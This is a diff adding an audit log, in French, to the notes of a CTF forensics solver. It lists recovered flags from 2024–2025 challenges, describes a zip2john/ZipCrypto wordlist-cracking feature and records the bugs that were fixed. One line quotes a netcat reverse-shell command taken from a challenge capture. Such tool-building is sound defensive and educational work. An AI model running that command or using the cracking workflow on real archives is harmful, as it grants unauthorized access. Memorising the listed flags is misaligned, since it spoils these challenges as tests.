@@ -378,3 +378,79 @@ chiffré → « blob chiffré », il faut pka2xml), breaking-away, just-hang-man
 - Décoder SNOW soi-même (stegsnow n'est pas installé ici : pas de vérité terrain).
 - Quelques faux « classical » restent sur des requêtes HTTP très courtes (bruit, pas de
   blocage).
+
+## Huitième audit — 7 nouveaux CTF (lot N, 2026-11-13)
+
+22 challenges forensics de **7 CTF** jamais vus (AuvergnHack 2025, BuckeyeCTF 2025,
+CrewCTF 2024, GreyCat 2025, HeroCTF 2024/2025, IrisCTF 2025), via sajjadium +
+les dépôts publics. Harnais : `scratchpad/steps.py` (une ligne par fichier).
+
+### Flags sortis seuls
+
+| Challenge | Flag | Comment |
+|---|---|---|
+| BuckeyeCTF 1985 | `bctf{D1d_y0u_Us3_An_3mul4t0r_Or_d3c0mp1lEr}` | uu → xor('*'), déjà couvert |
+| BuckeyeCTF The_Professors_Files | `bctf{docx_is_zip}` | flag dans `theme1.xml` du docx |
+| IrisCTF deldeldel | `irisctf{this_keylogger_is_too_hard_to_use}` | HID USB dans un pcapng |
+| **BuckeyeCTF zip2john2zip** | `bctf{not_all_hashes_are_hashed_equally}` | **nouveau (lot N)** : le `$pkzip2$` porte les octets chiffrés, ctfc casse et déchiffre le fichier depuis la ligne elle-même |
+
+### La nouveauté : les lignes `$pkzip2$` (zip2john)
+
+`zip2john` ne hache rien pour ZipCrypto : il **recopie les octets chiffrés** dans
+la ligne, avec le CRC-32 du clair. Donc le bon mot de passe déchiffre le fichier
+*depuis le hash*, l'archive n'est même pas nécessaire (challenge « zip2john2zip » :
+on n'a que le hash). Construit :
+
+- `core/zipcrypto.py` : le stream PKWARE traditionnel (CRC-32 brut, pas
+  `zlib.crc32` qui inverse), vérifié octet pour octet contre `zipfile`.
+- `core/pkzip2.py` : lit la ligne (`$pkzip2$C*B*DT*...`), essaie les mots de passe
+  (filtre 12 octets d'en-tête puis CRC-32, ~100 000/s), déchiffre et **reconstruit
+  le ZIP** (ouvert par 7z et `zipfile` avec le mot de passe, et refusé sans).
+- `ctfc hash <fichier> --wordlist rockyou --out flag.txt` : accepte un fichier,
+  sort le flag et écrit le fichier. Mode hashcat déduit (17200/17210/17220/17225).
+- Reader `pkzip2` + piste `zip2john` (le mot de passe `factfinder` du challenge
+  est à la ligne 955 100 de rockyou → ~9 s dans ctfc, ou hashcat).
+- **Vérité terrain** : `hashcat -m 17210` casse la même ligne ; 7z ouvre le ZIP
+  reconstruit. Test `test_audit8.py` (skip si 7z/hashcat absents).
+
+### Bugs trouvés et corrigés
+
+1. **Faux flag de force 1,0 depuis un reader** : `0x{2:X8}` (une chaîne de format
+   .NET dans un log PowerShell, HeroCTF Operation Pensieve) était déclaré flag par
+   le reader evtx et stoppait la recherche. `solve` re-note maintenant tout flag
+   rendu par un reader avec `flags.rate()` : un `XXX{...}` générique faible n'est
+   plus gardé comme la réponse.
+2. **`repair.byte_order` bouclait en Python sur un fichier entier** : le JSON de
+   227 Mo d'IrisCTF Tracem_1 faisait un **timeout > 300 s**. `swap_words` utilise
+   `array.byteswap` (C) et ne retourne tout le fichier que si l'en-tête inversé
+   montre déjà une signature. 300 s → 20 s.
+3. **Regex de flag générique quadratique** : sur une sortie binaire avec beaucoup
+   de `{`, sans `}` ni `\n`, le corps `[^}\n]{4,}` partait en O(n²) (8 s sur
+   400 Ko d'un essai XOR). Borné à `{4,120}` (un corps > 120 n'est jamais gardé).
+   CSV HeroCTF Tenant_trouble : 20 s → 5,7 s.
+4. **`ctfc zip --wordlist` mentait sur du WinZip AES** : `zipfile` n'ouvre que
+   ZipCrypto, donc chaque mot « échouait » et l'outil disait « aucun n'est le mot
+   de passe » (CrewCTF Fiilllleeeeeeee, dont le mot de passe était dans la liste).
+   Il dit maintenant que la liste n'a PAS été essayée et renvoie vers zip2john/hashcat.
+5. **Faux carve `.vmdk`** : le magic VMDK ne fait que 4 octets (`KDMV`) et
+   apparaît par hasard à 185 Mo dans le JSON de Tracem_1 → un faux disque de 42 Mo
+   mâché par The Sleuth Kit. Le sig épingle maintenant la version (1/2/3) du
+   sparse header : 8 octets, plus de hasard.
+
+### Jugé mais hors scope (pas de ML, investigation Q/R)
+
+- **AuvergnHack StratoMonk 1/2** : captures d'appels système **sysdig (.scap)**.
+  Flag = IP + chemin + commande à reconstruire. Tentative d'ajout d'un magic .scap
+  **abandonnée** : le BOM pcapng `0x1A2B3C4D` écrit en little-endian **est**
+  `4d3c2b1a`, donc ma signature se déclenchait sur tout pcapng LE — et le sysdig
+  installé ici ne lit même pas ce `.scap` (pas de vérité terrain). `strings` montre
+  déjà `ps -p 1;nc 192.168.1.99 8000 -e sh` et les chemins cron.
+- HeroCTF Operation Pensieve (DCSync), Tenant_trouble (logs de connexion Azure),
+  IrisCTF Tracem_1 (227 Mo d'EDR), StratoMonk : **investigation Q/R**, le flag est
+  une réponse à déduire, pas un fichier à déchiffrer.
+- Beezchurger (GIF), shredder (PNG déchiqueté à reconstruire d'après le `.c`),
+  Bugle (MP3, spectrogramme), Layer_Cake / Notsus.Exe (zips imbriqués chiffrés),
+  Recursion / Unfare (USB/NFC), RIP_Art (pcap) : stego visuel, audio ou multi-étapes.
+
+**Tests** : 1859 passent (+13), `make fuzz` propre (32 000 tours / 40 readers),
+`make fuzz-web` propre (52 routes).
